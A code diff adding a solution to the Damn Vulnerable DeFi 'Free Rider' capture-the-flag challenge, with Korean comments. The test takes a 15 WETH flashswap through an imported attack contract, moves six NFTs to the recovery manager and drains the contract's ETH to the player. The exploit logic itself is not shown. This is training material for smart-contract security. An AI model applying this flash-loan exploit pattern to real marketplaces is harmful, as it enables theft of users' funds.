@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Attack} from "./Attack.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +124,22 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+        Attack attack = new Attack(address(uniswapPair), address(marketplace), address(recoveryManager));
+        // flashswap 수수료 지불을 위한 WETH 변환
+        weth.deposit{value : PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(attack), UNISWAP_INITIAL_WETH_RESERVE);
         
+        // flashswap 요청 - 15WETH 빌리기
+        attack.flashswap(address(weth), 15 ether);
+
+        // NFT 6개 RecoveryManager에 전송
+        attack.sendNFTsToRecoveryManager();
+
+        // attack contract의 모든 ETH를 player에게 전송
+        attack.sendAllETHToPlayer();
+
+        console.log("player balance", player.balance);
+        console.log("weth balance", weth.balanceOf(address(player)));
     }
 
     /**
